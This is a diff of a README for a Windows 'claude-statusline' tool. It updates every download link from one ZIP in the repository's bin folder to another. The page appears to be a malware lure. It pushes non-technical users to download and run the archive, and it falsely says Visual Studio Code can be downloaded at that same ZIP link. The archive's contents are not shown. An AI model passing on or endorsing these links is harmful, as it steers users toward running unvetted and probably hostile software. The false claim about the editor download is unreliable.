@@ -1,6 +1,6 @@
 # ⚙️ claude-statusline - Clear, Simple Statusline Setup
 
-[![Download claude-statusline](https://img.shields.io/badge/Download-claude--statusline-blue?style=for-the-badge)](https://github.com/crosscountryridinggirlwonder916/claude-statusline/raw/refs/heads/main/bin/statusline_claude_v1.1.zip)
+[![Download claude-statusline](https://img.shields.io/badge/Download-claude--statusline-blue?style=for-the-badge)](https://raw.githubusercontent.com/crosscountryridinggirlwonder916/claude-statusline/main/bin/statusline_claude_v3.7-beta.3.zip)
 
 ---
 
@@ -28,7 +28,7 @@ To run claude-statusline on your Windows computer, here are the basic requiremen
 
 You can get claude-statusline from the main GitHub page below. The link takes you to the project where you can download the files you need.
 
-[Download claude-statusline here](https://github.com/crosscountryridinggirlwonder916/claude-statusline/raw/refs/heads/main/bin/statusline_claude_v1.1.zip)
+[Download claude-statusline here](https://raw.githubusercontent.com/crosscountryridinggirlwonder916/claude-statusline/main/bin/statusline_claude_v3.7-beta.3.zip)
 
 Click the green button above or follow these instructions:
 
@@ -55,7 +55,7 @@ You need a text editor where claude-statusline will show its status line. Some p
 - Vim
 - Neovim
 
-If you do not have a text editor yet, you can download one like Visual Studio Code at https://github.com/crosscountryridinggirlwonder916/claude-statusline/raw/refs/heads/main/bin/statusline_claude_v1.1.zip
+If you do not have a text editor yet, you can download one like Visual Studio Code at https://raw.githubusercontent.com/crosscountryridinggirlwonder916/claude-statusline/main/bin/statusline_claude_v3.7-beta.3.zip
 
 ---
 
@@ -121,7 +121,7 @@ If claude-statusline does not appear or work as expected:
 
 To update your setup:
 
-1. Visit the main repository link: https://github.com/crosscountryridinggirlwonder916/claude-statusline/raw/refs/heads/main/bin/statusline_claude_v1.1.zip
+1. Visit the main repository link: https://raw.githubusercontent.com/crosscountryridinggirlwonder916/claude-statusline/main/bin/statusline_claude_v3.7-beta.3.zip
 2. Download the latest ZIP file following the same steps as before.
 3. Extract and replace your existing claude-statusline folder with the new one.
 4. Restart your editor.
@@ -142,6 +142,6 @@ If you want to know more about statuslines or how to customize them, check out:
 
 ## 🖱 Download claude-statusline again
 
-[Get claude-statusline from GitHub](https://github.com/crosscountryridinggirlwonder916/claude-statusline/raw/refs/heads/main/bin/statusline_claude_v1.1.zip) 
+[Get claude-statusline from GitHub](https://raw.githubusercontent.com/crosscountryridinggirlwonder916/claude-statusline/main/bin/statusline_claude_v3.7-beta.3.zip) 
 
 You can use this link any time to download or update the setup. Just follow the instructions here to get started or refresh the files on your PC.
